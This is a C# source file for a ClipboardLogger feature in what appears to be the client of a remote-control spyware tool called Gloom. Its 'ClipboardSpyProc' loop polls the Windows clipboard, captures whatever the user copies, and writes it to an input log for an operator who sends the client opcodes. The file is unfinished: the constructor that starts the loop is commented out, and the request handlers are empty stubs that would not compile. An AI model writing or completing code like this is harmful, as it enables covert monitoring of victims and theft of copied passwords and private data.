using Gloom.Client.Features.Logger.InputLog;
using System.Text;

namespace Gloom.Client.Features.Logger
{
	public class ClipboardLogger : FeatureBase, IDisposable
	{
		protected readonly CancellationTokenSource cancel;

		private int PrevSequenceNum = 0;
		private bool disposed;

		public ClipboardLogger(IMessageSender sender) : base(sender)
		{
		}

		public override Guid[] AcceptedOps => new Guid[] { OpCodes.ClipboardLogRequest, OpCodes.ClipboardLoggerSettingRequest };

		//public ClipboardLogger()
		//{
		//	cancel = new CancellationTokenSource();
		//	Task.Run(async () => await ClipboardSpyProc(cancel.Token));
		//}

		private async Task ClipboardSpyProc(CancellationToken ct)
		{
			while (!ct.IsCancellationRequested)
			{
				int newSeqNum = User32.GetClipboardSequenceNumber();
				if (PrevSequenceNum != newSeqNum)
				{
					var Data = GetClipboardDataNative();
					if (Data != null)
					{
						if (Data.Length > 100)
							Data = Data[..100] + " (truncated)";
						InputLogWriter.Push(new ClipboardChangeEntry(DateTime.Now, Data));
					}
				}
				PrevSequenceNum = newSeqNum;
				await Task.Delay(Config.TheConfig.InputLog.ClipboardSpyDelay, ct);
			}
		}

		public override Task HandleAsync(Guid op, byte[] data)
		{
			if (op == OpCodes.ClipboardLogRequest)
			{

			}
			else if (op == OpCodes.ClipboardLoggerSettingRequest)
			{

			}
		}
	}

	internal class ClipboardChangeEntry : InputLogEntry
	{
		private readonly string Clipboard;

		public override string PlainTextMessage
		{
			get
			{
				var sb = new StringBuilder();
				sb.AppendLine(Environment.NewLine);
				sb.AppendLine("##### Clipboard change #####");
				sb.Append("Time: ").AppendLine(Timestamp.ToString()); // todo: format support
				sb.Append("Data: \"").Append(Clipboard).AppendLine("\"");
				sb.AppendLine("##### Clipboard change #####");
				return sb.ToString();
			}
		}

		public override object[] DbMessage
		{
			get => new object[] { Clipboard };
		}

		public ClipboardChangeEntry(DateTime timeStamp, string clipboard) : base(timeStamp)
		{
			Clipboard = clipboard;
		}
	}
}
